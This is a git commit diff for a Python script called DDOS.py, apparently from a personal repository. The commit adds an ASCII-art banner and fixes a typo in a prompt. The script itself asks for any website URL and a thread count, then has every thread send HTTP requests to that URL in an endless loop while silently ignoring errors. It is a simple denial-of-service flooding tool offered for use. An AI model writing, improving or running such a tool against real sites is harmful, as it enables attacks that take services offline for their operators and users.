4d00824fabd0c52700265bade22a07b2b8963135
MR RUBISH <150536726+rubish69@users.noreply.github.com>
2024-01-24 20:41:22 +0600

    Update and rename DDOS2.py to DDOS.py

--- DDOS.py
+++ DDOS.py
@@ -1,11 +1,17 @@
 import requests
 import threading
 
+# Define a banner message
+BANNER = """\033[1;32m
+█▀▄ █▀▄ █▀█ █▀   ▄▄ █▀█ █░█ █▄▄ █ █▀ █░█
+█▄▀ █▄▀ █▄█ ▄█   ░░ █▀▄ █▄█ █▄█ █ ▄█ █▀█
+\033[0m"""
+
 def send_request(url):
     try:
         while True:
             response = requests.get(url)
-            print("\033[1;31mDdos Attack SentðŸ’€")
+            print(BANNER)
     except:
         pass
 
@@ -21,6 +27,6 @@ def start_ddos(url, num_threads):
 
 if __name__ == "__main__":
     website_url = input("Enter the website URL: ")
-    num_threads = int(input("Enter the number of thread you want to send to the website: "))
+    num_threads = int(input("Enter the number of threads you want to send to the website: "))
 
     start_ddos(website_url, num_threads)
